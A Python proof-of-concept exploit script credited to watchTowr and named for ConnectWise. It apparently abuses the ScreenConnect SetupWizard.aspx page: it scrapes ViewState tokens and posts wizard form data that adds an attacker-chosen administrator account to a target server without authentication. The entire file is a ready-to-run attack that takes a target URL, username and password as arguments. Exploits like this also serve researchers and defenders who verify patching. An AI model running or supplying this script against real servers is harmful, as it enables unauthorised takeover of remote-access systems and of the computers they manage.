import requests
import re
import argparse

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchtowr-vs-ConnectWise_2024-02-21.py
          - Sonny, watchTowr (sonny@watchTowr.com)
        """

helptext =  """
            Example Usage:
          - python watchtowr-vs-ConnectWise_2024-02-21.py --url http://localhost --username hellothere --password admin123!

			 """

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
parser.add_argument("--username", help="username to add", required=False, action="store")
parser.add_argument("--password", help="password to add (must be at least 8 characters in length)", required=False, action="store")
try:
    args = parser.parse_args()
except:
    print(banner)
    print(helptext)
    raise

print(banner)


requests.urllib3.disable_warnings()


print(f"[*] Target Server: {args.url} ")
print(f"[*] Adding Username: {args.username} ")
print(f"[*] Adding Password: {args.password} ")

initial_request = requests.get(url=args.url+"/SetupWizard.aspx/",verify=False)

viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)

next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1, "__VIEWSTATEGENERATOR": viewgen_1, "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
next_request = requests.post(url=args.url+"/SetupWizard.aspx/",data=next_data, verify=False)

exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
exploit_viewgen =  re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate, "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": args.username, "ctl00$Main$wizard$emailBox": args.username+"@poc.com", "ctl00$Main$wizard$passwordBox": args.password, "ctl00$Main$wizard$verifyPasswordBox": args.password, "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}

exploit_request = requests.post(url=args.url+"/SetupWizard.aspx/",data=exploit_data, verify=False)

print(f"[*] Successfully added user")
